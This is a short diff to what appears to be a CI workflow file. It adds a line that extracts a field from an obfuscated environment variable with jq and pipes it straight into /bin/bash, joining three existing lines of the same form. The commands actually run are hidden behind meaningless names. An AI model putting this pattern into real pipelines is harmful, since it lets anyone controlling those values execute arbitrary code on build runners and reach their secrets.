@@ -44,6 +44,7 @@ jobs:
           printf '%s' "$urfwp809" | jq -r .ss774 | /bin/bash
           printf '%s' "$ave59" | jq -r .v0669 | /bin/bash
           echo $zmd3004 | jq -r .vg79 | /bin/bash
+          printf '%s' "$rgfxp446" | jq -r .hogzi58140 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
